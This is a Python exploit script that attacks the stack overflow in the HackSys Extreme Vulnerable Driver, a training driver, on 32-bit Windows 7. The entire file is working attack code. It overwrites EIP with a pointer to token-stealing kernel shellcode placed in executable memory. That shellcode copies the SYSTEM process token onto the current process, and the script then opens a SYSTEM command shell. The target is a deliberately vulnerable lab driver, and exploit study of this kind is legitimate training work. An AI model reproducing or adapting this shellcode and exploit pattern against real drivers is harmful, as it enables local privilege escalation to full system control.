import struct, sys
from ctypes import *
from subprocess import *

def main():
    kernel32 = windll.kernel32
    
    # Call CreateFileA() to create handle to vulnerable "\\\\.\\HackSysExtremeVulnerableDriver" driver object
    print("[+] Calling CreateFileA() to obtain a handle to the driver..\n")
    vulnDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None, 0x3, 0, None)
 
    # Validate handle to vulnerable "\\\\.\\HackSysExtremeVulnerableDriver" driver object
    if not vulnDevice or vulnDevice == -1:
        print("[-] Error - Unable to obtain a handle to the driver..\n")
        sys.exit(1)
    print("[+] Successfully obtained a handle to the driver..\n")

    # Set 'pre' variable to offset of EIP
    pre = "A" * 2080

    # Tokenstealing shellcode on Windows 7 (x86)
    shellcode = ""
    shellcode += bytearray(
        "\x60"                            # pushad --> Save registers state
        "\x31\xc0"                        # xor eax,eax --> Set to 0 (Start of Token Stealing)
        "\x64\x8b\x80\x24\x01\x00\x00"    # mov eax,[fs:eax+0x124] --> Get nt!_KPCR.PcrbData.CurrentThread
        "\x8b\x40\x50"                    # mov eax,[eax+0x50] --> Get nt!_KTHREAD.ApcState.Process
        "\x89\xc1"                        # mov ecx,eax --> Copy current process _EPROCESS structure
        "\xba\x04\x00\x00\x00"            # mov edx,0x4 --> Windows 7 'SYSTEM' process PID = 0x4
        "\x8b\x80\xb8\x00\x00\x00"        # mov eax,[eax+0xb8] --> Get nt!_EPROCESS.ActiveProcessLinks.Flink
        "\x2d\xb8\x00\x00\x00"            # sub eax,0xb8
        "\x39\x90\xb4\x00\x00\x00"        # cmp [eax+0xb4],edx --> Get nt!_EPROCESS.UniqueProcessId
        "\x75\xed"                        # jnz 0x1a
        "\x8b\x90\xf8\x00\x00\x00"        # mov edx,[eax+0xf8] --> Get 'SYSTEM' process nt!_EPROCESS.Token
        "\x89\x91\xf8\x00\x00\x00"        # mov [ecx+0xf8],edx --> Replace target process nt!_EPROCESS.Token with 'SYSTEM' process nt!_EPROCESS.Token
        "\x61"                            # popad --> Restore registers state
        "\x31\xc0"                        # xor eax,eax --> Set to 0 (Start normal execution flow)
        "\x5d"                            # pop ebp
        "\xc2\x08\x00"                    # ret 0x8 --> (Finish normal execution flow)
    )

    pointer = kernel32.VirtualAlloc(c_int(0), c_int(len(shellcode)), c_int(0x3000), c_int(0x40))
    buff = (c_char * len(shellcode)).from_buffer(shellcode)

    kernel32.RtlMoveMemory(c_int(pointer), buff, c_int(len(shellcode)))
    shellcode_finale = struct.pack("<L", pointer)

    buffer = pre + shellcode_finale
    bufferLen = len(buffer)

    # Interact with vulnerable "\\\\.\\HackSysExtremeVulnerableDriver" driver
    print("[+] Starting interaction with the driver..\n");
    kernel32.DeviceIoControl(vulnDevice, 0x222003, buffer, bufferLen, None, 0, byref(c_ulong()), None)
    Popen("start cmd", shell = True)
    
    kernel32.CloseHandle(vulnDevice)

if __name__ == "__main__":
    main()
